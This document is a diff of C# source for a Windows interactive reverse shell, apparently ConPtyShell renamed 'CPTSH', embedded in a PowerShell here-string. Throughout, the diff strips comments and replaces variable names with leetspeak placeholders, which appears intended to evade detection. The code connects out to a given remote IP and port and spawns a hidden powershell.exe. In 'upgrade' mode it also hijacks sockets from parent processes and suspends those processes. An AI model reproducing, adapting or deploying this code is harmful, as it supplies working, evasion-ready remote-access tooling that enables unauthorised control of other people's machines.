-        //  Console.WriteLine("debug: nBytesReceived = " + nBytesReceived + " WSAGetLastError() = " + WSAGetLastError().ToString());
-        TerminateProcess(hChildProcess, 0);
+            byte[] ${byt35R3c31v3d} = new byte[${buff3rS1z3}];
+            ${nByt35R3c31v3d} = recv(${sh3llS0ck3t}, ${byt35R3c31v3d}, ${buff3rS1z3}, 0);
+            ${wr1t3Succ355} = WriteFile(${1nputP1p3Wr1t3}, ${byt35R3c31v3d}, (uint)${nByt35R3c31v3d}, out ${byt35Wr1tt3n}, IntPtr.Zero);
+        } while (${nByt35R3c31v3d} > 0 && ${wr1t3Succ355});
+        TerminateProcess(${hCh1ldPr0c355}, 0);
     }
 
-    private static void ThreadReadSocketWritePipeNonOverlapped(object threadParams)
+    private static void ThreadReadSocketWritePipeNonOverlapped(object ${thr34dP4r4m5})
     {
-        object[] threadParameters = (object[])threadParams;
-        IntPtr InputPipeWrite = (IntPtr)threadParameters[0];
-        IntPtr shellSocket = (IntPtr)threadParameters[1];
-        IntPtr hChildProcess = (IntPtr)threadParameters[2];
-        int bufferSize = 8192;
-        bool writeSuccess = false;
-        Int32 nBytesReceived = 0;
-        uint bytesWritten = 0;
-        bool socketBlockingOperation = false;
-        IntPtr wsaReadEvent = WSACreateEvent();
-        // we expect the socket to be non-blocking at this point. we create an asynch event to be signaled when the recv operation is ready to get some data
-        WSAEventSelect(shellSocket, wsaReadEvent, FD_READ);
-        IntPtr[] wsaEventsArray = new IntPtr[] { wsaReadEvent };
+        object[] ${thr34dP4r4m3t3r5} = (object[])${thr34dP4r4m5};
+        IntPtr ${1nputP1p3Wr1t3} = (IntPtr)${thr34dP4r4m3t3r5}[0];
+        IntPtr ${sh3llS0ck3t} = (IntPtr)${thr34dP4r4m3t3r5}[1];
+        IntPtr ${hCh1ldPr0c355} = (IntPtr)${thr34dP4r4m3t3r5}[2];
+        int ${buff3rS1z3} = 8192;
+        bool ${wr1t3Succ355} = false;
+        Int32 ${nByt35R3c31v3d} = 0;
+        uint ${byt35Wr1tt3n} = 0;
+        bool ${s0ck3tBl0ck1ng0p3r4t10n} = false;
+        IntPtr ${ws4R34d3v3nt} = WSACreateEvent();
+        WSAEventSelect(${sh3llS0ck3t}, ${ws4R34d3v3nt}, ${FDR34D});
+        IntPtr[] ${ws43v3nt54rr4y} = new IntPtr[] { ${ws4R34d3v3nt} };
         do
         {
-            byte[] bytesReceived = new byte[bufferSize];
-            WSAWaitForMultipleEvents(wsaEventsArray.Length, wsaEventsArray, true, 500, false);
-            nBytesReceived = recv(shellSocket, bytesReceived, bufferSize, 0);
-            // we still check WSAEWOULDBLOCK for a more robust implementation
-            if (WSAGetLastError() == WSAEWOULDBLOCK)
+            byte[] ${byt35R3c31v3d} = new byte[${buff3rS1z3}];
+            WSAWaitForMultipleEvents(${ws43v3nt54rr4y}.Length, ${ws43v3nt54rr4y}, true, 500, false);
+            ${nByt35R3c31v3d} = recv(${sh3llS0ck3t}, ${byt35R3c31v3d}, ${buff3rS1z3}, 0);
+            if (WSAGetLastError() == ${WSA3WOULDBL0CK})
             {
-                socketBlockingOperation = true;
+                ${s0ck3tBl0ck1ng0p3r4t10n} = true;
                 continue;
             }
-            WSAResetEvent(wsaReadEvent);
-            socketBlockingOperation = false;
-            // Console.WriteLine("debug: ThreadReadSocketWritePipe recv: nBytesReceived = " + nBytesReceived + " WSAGetLastError() = " + WSAGetLastError().ToString());
-            writeSuccess = WriteFile(InputPipeWrite, bytesReceived, (uint)nBytesReceived, out bytesWritten, IntPtr.Zero);
-            // Console.WriteLine("debug ThreadReadSocketWritePipe WriteFile: bytesWritten = " + bytesWritten + " Marshal.GetLastWin32Error() = " + Marshal.GetLastWin32Error());
-        } while (socketBlockingOperation || (nBytesReceived > 0 && writeSuccess));
-        WSACloseEvent(wsaReadEvent);
-        TerminateProcess(hChildProcess, 0);
+            WSAResetEvent(${ws4R34d3v3nt});
+            ${s0ck3tBl0ck1ng0p3r4t10n} = false;
+            ${wr1t3Succ355} = WriteFile(${1nputP1p3Wr1t3}, ${byt35R3c31v3d}, (uint)${nByt35R3c31v3d}, out ${byt35Wr1tt3n}, IntPtr.Zero);
+        } while (${s0ck3tBl0ck1ng0p3r4t10n} || (${nByt35R3c31v3d} > 0 && ${wr1t3Succ355}));
+        WSACloseEvent(${ws4R34d3v3nt});
+        TerminateProcess(${hCh1ldPr0c355}, 0);
     }
 
-    private static Thread StartThreadReadSocketWritePipe(IntPtr InputPipeWrite, IntPtr shellSocket, IntPtr hChildProcess, bool overlappedSocket)
+    private static Thread StartThreadReadSocketWritePipe(IntPtr ${1nputP1p3Wr1t3}, IntPtr ${sh3llS0ck3t}, IntPtr ${hCh1ldPr0c355}, bool ${0v3rl4pp3dS0ck3t})
     {
-        object[] threadParameters = new object[3];
-        threadParameters[0] = InputPipeWrite;
-        threadParameters[1] = shellSocket;
-        threadParameters[2] = hChildProcess;
-        Thread thReadSocketWritePipe;
-        if(overlappedSocket)
-            thReadSocketWritePipe = new Thread(ThreadReadSocketWritePipeOverlapped);
+        object[] ${thr34dP4r4m3t3r5} = new object[3];
+        ${thr34dP4r4m3t3r5}[0] = ${1nputP1p3Wr1t3};
+        ${thr34dP4r4m3t3r5}[1] = ${sh3llS0ck3t};
+        ${thr34dP4r4m3t3r5}[2] = ${hCh1ldPr0c355};
+        Thread ${thR34dS0ck3tWr1t3P1p3};
+        if(${0v3rl4pp3dS0ck3t})
+            ${thR34dS0ck3tWr1t3P1p3} = new Thread(ThreadReadSocketWritePipeOverlapped);
         else
-            thReadSocketWritePipe = new Thread(ThreadReadSocketWritePipeNonOverlapped);
-        thReadSocketWritePipe.Start(threadParameters);
-        return thReadSocketWritePipe;
+            ${thR34dS0ck3tWr1t3P1p3} = new Thread(ThreadReadSocketWritePipeNonOverlapped);
+        ${thR34dS0ck3tWr1t3P1p3}.Start(${thr34dP4r4m3t3r5});
+        return ${thR34dS0ck3tWr1t3P1p3};
     }
 
-    public static string SpawnCONTs(string remoteIp, int remotePort, uint rows, uint cols, string commandLine, bool upgradeShell)
+    public static string SpawnCPTSH(string ${r3m0t31p}, int ${r3m0t3P0rt}, uint ${r0w5}, uint ${c0l5}, string ${c0mm4ndL1n3}, bool ${upgr4d3Sh3ll})
     {
-        IntPtr shellSocket = IntPtr.Zero;
-        IntPtr InputPipeRead = IntPtr.Zero;
-        IntPtr InputPipeWrite = IntPtr.Zero;
-        IntPtr OutputPipeRead = IntPtr.Zero;
-        IntPtr OutputPipeWrite = IntPtr.Zero;
-        IntPtr handlePseudoConsole = IntPtr.Zero;
-        IntPtr oldStdIn = IntPtr.Zero;
-        IntPtr oldStdOut = IntPtr.Zero;
-        IntPtr oldStdErr = IntPtr.Zero;
-        bool newConsoleAllocated = false;
-        bool parentSocketInherited = false;
-        bool grandParentSocketInherited = false;
-        bool conptyCompatible = false;
-        bool IsSocketOverlapped = true;
-        string output = "";
-        Process currentProcess = null;
-        Process parentProcess = null;
-        Process grandParentProcess = null;
+        IntPtr ${sh3llS0ck3t} = IntPtr.Zero;
+        IntPtr ${1nputP1p3R34d} = IntPtr.Zero;
+        IntPtr ${1nputP1p3Wr1t3} = IntPtr.Zero;
+        IntPtr ${0utputP1p3R34d} = IntPtr.Zero;
+        IntPtr ${0utputP1p3Wr1t3} = IntPtr.Zero;
+        IntPtr ${h4ndl3P53ud0C0ns0l3} = IntPtr.Zero;
+        IntPtr ${0ldStd1n} = IntPtr.Zero;
+        IntPtr ${0ldStd0ut} = IntPtr.Zero;
+        IntPtr ${0ldStd3rr} = IntPtr.Zero;
+        bool ${n3wC0ns0l34ll0c4t3d} = false;
+        bool ${p4r3ntS0ck3t1nh3r1t3d} = false;
+        bool ${gr4ndP4r3ntS0ck3t1nh3r1t3d} = false;
+        bool ${c0nptyC0mp4t1bl3} = false;
+        bool ${1sS0ck3t0v3rl4pp3d} = true;
+        string ${0utput} = "";
+        Process ${curr3ntPr0c355} = null;
+        Process ${p4r3ntPr0c355} = null;
+        Process ${gr4ndP4r3ntPr0c355} = null;
         if (GetProcAddress(GetModuleHandle("kernel32"), "CreatePseudoConsole") != IntPtr.Zero)
-            conptyCompatible = true;
-        PROCESS_INFORMATION childProcessInfo = new PROCESS_INFORMATION();
-        CreatePipes(ref InputPipeRead, ref InputPipeWrite, ref OutputPipeRead, ref OutputPipeWrite);
-        // comment the below function to debug errors
-        InitConsole(ref oldStdIn, ref oldStdOut, ref oldStdErr);
-        // init wsastartup stuff for this thread
+            ${c0nptyC0mp4t1bl3} = true;
+        PROCESS_INFORMATION ${ch1ldPr0c3551nf0} = new PROCESS_INFORMATION();
+        CreatePipes(ref ${1nputP1p3R34d}, ref ${1nputP1p3Wr1t3}, ref ${0utputP1p3R34d}, ref ${0utputP1p3Wr1t3});
+        InitConsole(ref ${0ldStd1n}, ref ${0ldStd0ut}, ref ${0ldStd3rr});
         InitWSAThread();
-        if (conptyCompatible)
+        if (${c0nptyC0mp4t1bl3})
         {
             Console.WriteLine("\r\nCreatePseudoConsole function found! Spawning a fully interactive shell\r\n");
-            if (upgradeShell)
+            if (${upgr4d3Sh3ll})
             {
-                List<IntPtr> socketsHandles = new List<IntPtr>();
-                currentProcess = Process.GetCurrentProcess();
-                parentProcess = ParentProcessUtilities.GetParentProcess(currentProcess.Handle);
-                if (parentProcess != null) grandParentProcess = ParentProcessUtilities.GetParentProcess(parentProcess.Handle);
-                // try to duplicate the socket for the current process
-                shellSocket = SocketHijacking.DuplicateTargetProcessSocket(currentProcess, ref IsSocketOverlapped);
-                if (shellSocket == IntPtr.Zero && parentProcess != null)
+                ${curr3ntPr0c355} = Process.GetCurrentProcess();
+                ${p4r3ntPr0c355} = ParentProcessUtilities.GetParentProcess(${curr3ntPr0c355}.Handle);
+                if (${p4r3ntPr0c355} != null) ${gr4ndP4r3ntPr0c355} = ParentProcessUtilities.GetParentProcess(${p4r3ntPr0c355}.Handle);
+                ${sh3llS0ck3t} = SocketHijacking.DuplicateTargetProcessSocket(${curr3ntPr0c355}, ref ${1sS0ck3t0v3rl4pp3d});
+                if (${sh3llS0ck3t} == IntPtr.Zero && ${p4r3ntPr0c355} != null)
                 {
-                    // if no sockets are found in the current process we try to hijack our current parent process socket
-                    shellSocket = SocketHijacking.DuplicateTargetProcessSocket(parentProcess, ref IsSocketOverlapped);
-                    if (shellSocket == IntPtr.Zero && grandParentProcess != null)
+                    ${sh3llS0ck3t} = SocketHijacking.DuplicateTargetProcessSocket(${p4r3ntPr0c355}, ref ${1sS0ck3t0v3rl4pp3d});
+                    if (${sh3llS0ck3t} == IntPtr.Zero && ${gr4ndP4r3ntPr0c355} != null)
                     {
-                        // damn, even the parent process has no usable sockets, let's try a last desperate attempt in the grandparent process
-                        shellSocket = SocketHijacking.DuplicateTargetProcessSocket(grandParentProcess, ref IsSocketOverlapped);
-                        if (shellSocket == IntPtr.Zero)
+                        ${sh3llS0ck3t} = SocketHijacking.DuplicateTargetProcessSocket(${gr4ndP4r3ntPr0c355}, ref ${1sS0ck3t0v3rl4pp3d});
+                        if (${sh3llS0ck3t} == IntPtr.Zero)
                         {
-                            throw new CONTsException("No \\Device\\Afd objects found. Socket duplication failed.");
+                            throw new CPTSHException("No \\Device\\Afd objects found. Socket duplication failed.");
                         }
                         else
                         {
-                            grandParentSocketInherited = true;
+                            ${gr4ndP4r3ntS0ck3t1nh3r1t3d} = true;
                         }
                     }
                     else
                     {
-                        // gotcha a usable socket from the parent process, let's see if the grandParent also use the socket
-                        parentSocketInherited = true;
-                        if (grandParentProcess != null) grandParentSocketInherited = SocketHijacking.IsSocketInherited(shellSocket, grandParentProcess);
+                        ${p4r3ntS0ck3t1nh3r1t3d} = true;
+                        if (${gr4ndP4r3ntPr0c355} != null) ${gr4ndP4r3ntS0ck3t1nh3r1t3d} = SocketHijacking.IsSocketInherited(${sh3llS0ck3t}, ${gr4ndP4r3ntPr0c355});
                     }
                 }
                 else
                 {
-                    // the current process got a usable socket, let's see if the parents use the socket
-                    if (parentProcess != null) parentSocketInherited = SocketHijacking.IsSocketInherited(shellSocket, parentProcess);
-                    if (grandParentProcess != null) grandParentSocketInherited = SocketHijacking.IsSocketInherited(shellSocket, grandParentProcess);
+                    if (${p4r3ntPr0c355} != null) ${p4r3ntS0ck3t1nh3r1t3d} = SocketHijacking.IsSocketInherited(${sh3llS0ck3t}, ${p4r3ntPr0c355});
+                    if (${gr4ndP4r3ntPr0c355} != null) ${gr4ndP4r3ntS0ck3t1nh3r1t3d} = SocketHijacking.IsSocketInherited(${sh3llS0ck3t}, ${gr4ndP4r3ntPr0c355});
                 }
             }
             else
             {
-                shellSocket = connectRemote(remoteIp, remotePort);
-                if (shellSocket == IntPtr.Zero)
+                ${sh3llS0ck3t} = connectRemote(${r3m0t31p}, ${r3m0t3P0rt});
+                if (${sh3llS0ck3t} == IntPtr.Zero)
                 {
-                    output += string.Format("{0}Could not connect to ip {1} on port {2}", errorString, remoteIp, remotePort.ToString());
-                    return output;
+                    ${0utput} += string.Format("{0}Could not connect to ip {1} on port {2}", ${3rr0rStr1ng}, ${r3m0t31p}, ${r3m0t3P0rt}.ToString());
+                    return ${0utput};
                 }
-                TryParseRowsColsFromSocket(shellSocket, ref rows, ref cols);
+                TryParseRowsColsFromSocket(${sh3llS0ck3t}, ref ${r0w5}, ref ${c0l5});
             }
             if (GetConsoleWindow() == IntPtr.Zero)
             {
                 AllocConsole();
-                ShowWindow(GetConsoleWindow(), SW_HIDE);
-                newConsoleAllocated = true;
+                ShowWindow(GetConsoleWindow(), ${SWH1D3});
+                ${n3wC0ns0l34ll0c4t3d} = true;
             }
-            // debug code for checking handle duplication
-            // Console.WriteLine("debug: Creating pseudo console...");
-            // Thread.Sleep(180000);
-            // return "";
-            int pseudoConsoleCreationResult = CreatePseudoConsoleWithPipes(ref handlePseudoConsole, ref InputPipeRead, ref OutputPipeWrite, rows, cols);
-            if (pseudoConsoleCreationResult != 0)
+            int ${p53ud0C0ns0l3Cr34t10nR3sult} = CreatePseudoConsoleWithPipes(ref ${h4ndl3P53ud0C0ns0l3}, ref ${1nputP1p3R34d}, ref ${0utputP1p3Wr1t3}, ${r0w5}, ${c0l5});
+            if (${p53ud0C0ns0l3Cr34t10nR3sult} != 0)
             {
-                output += string.Format("{0}Could not create psuedo console. Error Code {1}", errorString, pseudoConsoleCreationResult.ToString());
-                return output;
+                ${0utput} += string.Format("{0}Could not create psuedo console. Error Code {1}", ${3rr0rStr1ng}, ${p53ud0C0ns0l3Cr34t10nR3sult}.ToString());
+                return ${0utput};
             }
-            childProcessInfo = CreateChildProcessWithPseudoConsole(handlePseudoConsole, commandLine);
+            ${ch1ldPr0c3551nf0} = CreateChildProcessWithPseudoConsole(${h4ndl3P53ud0C0ns0l3}, ${c0mm4ndL1n3});
         }
         else
         {
-            if (upgradeShell)
+            if (${upgr4d3Sh3ll})
             {
-                output += string.Format("Could not upgrade shell to fully interactive because ConPTY is not compatible on this system");
-                return output;
+                ${0utput} += string.Format("Could not upgrade shell to fully interactive because ConPTY is not compatible on this system");
+                return ${0utput};
             }
-            shellSocket = connectRemote(remoteIp, remotePort);
-            if (shellSocket == IntPtr.Zero)
+            ${sh3llS0ck3t} = connectRemote(${r3m0t31p}, ${r3m0t3P0rt});
+            if (${sh3llS0ck3t} == IntPtr.Zero)
             {
-                output += string.Format("{0}Could not connect to ip {1} on port {2}", errorString, remoteIp, remotePort.ToString());
-                return output;
+                ${0utput} += string.Format("{0}Could not connect to ip {1} on port {2}", ${3rr0rStr1ng}, ${r3m0t31p}, ${r3m0t3P0rt}.ToString());
+                return ${0utput};
             }
             Console.WriteLine("\r\nCreatePseudoConsole function not found! Spawning a netcat-like interactive shell...\r\n");
-            STARTUPINFO sInfo = new STARTUPINFO();
-            sInfo.cb = Marshal.SizeOf(sInfo);
-            sInfo.dwFlags |= (Int32)STARTF_USESTDHANDLES;
-            sInfo.hStdInput = InputPipeRead;
-            sInfo.hStdOutput = OutputPipeWrite;
-            sInfo.hStdError = OutputPipeWrite;
-            CreateProcess(null, commandLine, IntPtr.Zero, IntPtr.Zero, true, 0, IntPtr.Zero, null, ref sInfo, out childProcessInfo);
+            STARTUPINFO ${s1nf0} = new STARTUPINFO();
+            ${s1nf0}.cb = Marshal.SizeOf(${s1nf0});
+            ${s1nf0}.dwFlags |= (Int32)${ST4RTFUS3STDH4NDL35};
+            ${s1nf0}.hStdInput = ${1nputP1p3R34d};
+            ${s1nf0}.hStdOutput = ${0utputP1p3Wr1t3};
+            ${s1nf0}.hStdError = ${0utputP1p3Wr1t3};
+            CreateProcess(null, ${c0mm4ndL1n3}, IntPtr.Zero, IntPtr.Zero, true, 0, IntPtr.Zero, null, ref ${s1nf0}, out ${ch1ldPr0c3551nf0});
         }
-        // Note: We can close the handles to the PTY-end of the pipes here
-        // because the handles are dup'ed into the ConHost and will be released
-        // when the ConPTY is destroyed.
-        if (InputPipeRead != IntPtr.Zero) CloseHandle(InputPipeRead);
-        if (OutputPipeWrite != IntPtr.Zero) CloseHandle(OutputPipeWrite);
-        if (upgradeShell) {
-            // we need to suspend other processes that can interact with the duplicated sockets if any. This will ensure stdin, stdout and stderr is read/write only by our conpty process
-            if (parentSocketInherited) NtSuspendProcess(parentProcess.Handle);
-            if (grandParentSocketInherited) NtSuspendProcess(grandParentProcess.Handle);
-            if (!IsSocketOverlapped) SocketHijacking.SetSocketBlockingMode(shellSocket, 1);
+        if (${1nputP1p3R34d} != IntPtr.Zero) CloseHandle(${1nputP1p3R34d});
+        if (${0utputP1p3Wr1t3} != IntPtr.Zero) CloseHandle(${0utputP1p3Wr1t3});
+        if (${upgr4d3Sh3ll}) {
+            if (${p4r3ntS0ck3t1nh3r1t3d}) NtSuspendProcess(${p4r3ntPr0c355}.Handle);
+            if (${gr4ndP4r3ntS0ck3t1nh3r1t3d}) NtSuspendProcess(${gr4ndP4r3ntPr0c355}.Handle);
+            if (!${1sS0ck3t0v3rl4pp3d}) SocketHijacking.SetSocketBlockingMode(${sh3llS0ck3t}, 1);
         }
-        //Threads have better performance than Tasks
-        Thread thThreadReadPipeWriteSocket = StartThreadReadPipeWriteSocket(OutputPipeRead, shellSocket, IsSocketOverlapped);
-        Thread thReadSocketWritePipe = StartThreadReadSocketWritePipe(InputPipeWrite, shellSocket, childProcessInfo.hProcess, IsSocketOverlapped);
-        // wait for the child process until exit
-        WaitForSingleObject(childProcessInfo.hProcess, INFINITE);
-        //cleanup everything
-        thThreadReadPipeWriteSocket.Abort();
-        thReadSocketWritePipe.Abort();
-        if (upgradeShell)
+        Thread ${thThr34dR34dP1p3Wr1t3S0ck3t} = StartThreadReadPipeWriteSocket(${0utputP1p3R34d}, ${sh3llS0ck3t}, ${1sS0ck3t0v3rl4pp3d});
+        Thread ${thR34dS0ck3tWr1t3P1p3} = StartThreadReadSocketWritePipe(${1nputP1p3Wr1t3}, ${sh3llS0ck3t}, ${ch1ldPr0c3551nf0}.hProcess, ${1sS0ck3t0v3rl4pp3d});
+        WaitForSingleObject(${ch1ldPr0c3551nf0}.hProcess, ${1NF1N1T3});
+        ${thThr34dR34dP1p3Wr1t3S0ck3t}.Abort();
+        ${thR34dS0ck3tWr1t3P1p3}.Abort();
+        if (${upgr4d3Sh3ll})
         {
-            if (!IsSocketOverlapped)
+            if (!${1sS0ck3t0v3rl4pp3d})
             {
-                // cancelling the event selection for the socket
-                WSAEventSelect(shellSocket, IntPtr.Zero, 0);
-                SocketHijacking.SetSocketBlockingMode(shellSocket, 0);
+                WSAEventSelect(${sh3llS0ck3t}, IntPtr.Zero, 0);
+                SocketHijacking.SetSocketBlockingMode(${sh3llS0ck3t}, 0);
             }
-            if (parentSocketInherited) NtResumeProcess(parentProcess.Handle);
-            if (grandParentSocketInherited) NtResumeProcess(grandParentProcess.Handle);
+            if (${p4r3ntS0ck3t1nh3r1t3d}) NtResumeProcess(${p4r3ntPr0c355}.Handle);
+            if (${gr4ndP4r3ntS0ck3t1nh3r1t3d}) NtResumeProcess(${gr4ndP4r3ntPr0c355}.Handle);
         }
-        closesocket(shellSocket);
-        RestoreStdHandles(oldStdIn, oldStdOut, oldStdErr);
-        if (newConsoleAllocated)
+        closesocket(${sh3llS0ck3t});
+        RestoreStdHandles(${0ldStd1n}, ${0ldStd0ut}, ${0ldStd3rr});
+        if (${n3wC0ns0l34ll0c4t3d})
             FreeConsole();
-        CloseHandle(childProcessInfo.hThread);
-        CloseHandle(childProcessInfo.hProcess);
-        if (handlePseudoConsole != IntPtr.Zero) ClosePseudoConsole(handlePseudoConsole);
-        if (InputPipeWrite != IntPtr.Zero) CloseHandle(InputPipeWrite);
-        if (OutputPipeRead != IntPtr.Zero) CloseHandle(OutputPipeRead);
-        output += "CONTs kindly exited.\r\n";
-        return output;
+        CloseHandle(${ch1ldPr0c3551nf0}.hThread);
+        CloseHandle(${ch1ldPr0c3551nf0}.hProcess);
+        if (${h4ndl3P53ud0C0ns0l3} != IntPtr.Zero) ClosePseudoConsole(${h4ndl3P53ud0C0ns0l3});
+        if (${1nputP1p3Wr1t3} != IntPtr.Zero) CloseHandle(${1nputP1p3Wr1t3});
+        if (${0utputP1p3R34d} != IntPtr.Zero) CloseHandle(${0utputP1p3R34d});
+        ${0utput} += "CPTSH kindly exited.\r\n";
+        return ${0utput};
     }
 }
 
-public static class CONTsMainClass
+public static class CPTSHMainClass
 {
-    private static string help = @"";
+    private static string ${h3lp} = @"Usage: CPTSH <remoteIp> <remotePort> [rows] [cols] [commandLine]
+       CPTSH upgrade [rows] [cols] [commandLine]";
 
-    private static bool HelpRequired(string param)
+    private static bool HelpRequired(string ${p4r4m})
     {
-        return param == "-h" || param == "--help" || param == "/?";
+        return ${p4r4m} == "-h" || ${p4r4m} == "--help" || ${p4r4m} == "/?";
     }
 
-    private static void CheckArgs(string[] arguments)
+    private static void CheckArgs(string[] ${4rgum3nt5})
     {
-        if (arguments.Length < 2)
-            throw new CONTsException("\r\nCONTs: Not enough arguments. 2 Arguments required. Use --help for additional help.\r\n");
+        if (${4rgum3nt5}.Length < 2)
+            throw new CPTSHException("\r\nCPTSH: Not enough arguments. 2 Arguments required. Use --help for additional help.\r\n");
     }
 
     private static void DisplayHelp()
     {
-        Console.Out.Write(help);
+        Console.Out.Write(${h3lp});
     }
 
-    private static string CheckRemoteIpArg(string ipString)
+    private static string CheckRemoteIpArg(string ${1pStr1ng})
     {
-        IPAddress address;
-        if (!IPAddress.TryParse(ipString, out address))
-            throw new CONTsException("\r\nCONTs: Invalid remoteIp value" + ipString);
-        return ipString;
+        IPAddress ${4ddr355};
+        if (!IPAddress.TryParse(${1pStr1ng}, out ${4ddr355}))
+            throw new CPTSHException("\r\nCPTSH: Invalid remoteIp value" + ${1pStr1ng});
+        return ${1pStr1ng};
     }
 
-    private static int CheckInt(string arg)
+    private static int CheckInt(string ${4rg})
     {
-        int ret = 0;
-        if (!Int32.TryParse(arg, out ret))
-            throw new CONTsException("\r\nCONTs: Invalid integer value " + arg);
-        return ret;
+        int ${r3t} = 0;
+        if (!Int32.TryParse(${4rg}, out ${r3t}))
+            throw new CPTSHException("\r\nCPTSH: Invalid integer value " + ${4rg});
+        return ${r3t};
     }
 
-    private static uint ParseRows(string[] arguments)
+    private static uint ParseRows(string[] ${4rgum3nt5})
     {
-        uint rows = 24;
-        if (arguments.Length > 2)
-            rows = (uint)CheckInt(arguments[2]);
-        return rows;
+        uint ${r0w5} = 24;
+        if (${4rgum3nt5}.Length > 2)
+            ${r0w5} = (uint)CheckInt(${4rgum3nt5}[2]);
+        return ${r0w5};
     }
 
-    private static uint ParseCols(string[] arguments)
+    private static uint ParseCols(string[] ${4rgum3nt5})
     {
-        uint cols = 80;
-        if (arguments.Length > 3)
-            cols = (uint)CheckInt(arguments[3]);
-        return cols;
+        uint ${c0l5} = 80;
+        if (${4rgum3nt5}.Length > 3)
+            ${c0l5} = (uint)CheckInt(${4rgum3nt5}[3]);
+        return ${c0l5};
     }
 
-    private static string ParseCommandLine(string[] arguments)
+    private static string ParseCommandLine(string[] ${4rgum3nt5})
     {
-        string commandLine = "powershell.exe";
-        if (arguments.Length > 4)
-            commandLine = arguments[4];
-        return commandLine;
+        string ${c0mm4ndL1n3} = "powershell.exe";
+        if (${4rgum3nt5}.Length > 4)
+            ${c0mm4ndL1n3} = ${4rgum3nt5}[4];
+        return ${c0mm4ndL1n3};
     }
 
-    public static string CONTsMain(string[] args)
+    public static string CPTSHMain(string[] ${4r95})
     {
-        string output = "";
-        if (args.Length == 1 && HelpRequired(args[0]))
+        string ${0utput} = "";
+        if (${4r95}.Length == 1 && HelpRequired(${4r95}[0]))
         {
             DisplayHelp();
         }
         else
         {
-            string remoteIp = "";
-            int remotePort = 0;
-            bool upgradeShell = false;
+            string ${r3m0t31p} = "";
+            int ${r3m0t3P0rt} = 0;
+            bool ${upgr4d3Sh3ll} = false;
             try
             {
-                CheckArgs(args);
-                if (args[0].Contains("upgrade"))
-                    upgradeShell = true;
+                CheckArgs(${4r95});
+                if (${4r95}[0].Contains("upgrade"))
+                    ${upgr4d3Sh3ll} = true;
                 else
                 {
-                    remoteIp = CheckRemoteIpArg(args[0]);
-                    remotePort = CheckInt(args[1]);
+                    ${r3m0t31p} = CheckRemoteIpArg(${4r95}[0]);
+                    ${r3m0t3P0rt} = CheckInt(${4r95}[1]);
                 }
-                uint rows = ParseRows(args);
-                uint cols = ParseCols(args);
-                string commandLine = ParseCommandLine(args);
-                output = CONTs.SpawnCONTs(remoteIp, remotePort, rows, cols, commandLine, upgradeShell);
+                uint ${r0w5} = ParseRows(${4r95});
+                uint ${c0l5} = ParseCols(${4r95});
+                string ${c0mm4ndL1n3} = ParseCommandLine(${4r95});
+                ${0utput} = CPTSH.SpawnCPTSH(${r3m0t31p}, ${r3m0t3P0rt}, ${r0w5}, ${c0l5}, ${c0mm4ndL1n3}, ${upgr4d3Sh3ll});
             }
-            catch (Exception e)
+            catch (Exception ${3})
             {
-                Console.WriteLine("\n" + e.ToString() + "\n");
+                Console.WriteLine("\n" + ${3}.ToString() + "\n");
             }
         }
-        return output;
+        return ${0utput};
     }
 }
-
 
 class MainClass
 {
-    static void Main(string[] args)
+    static void Main(string[] ${4r95})
     {
-        Console.Out.Write(CONTsMainClass.CONTsMain(args));
+        Console.Out.Write(CPTSHMainClass.CPTSHMain(${4r95}));
     }
 }
-
 "@;
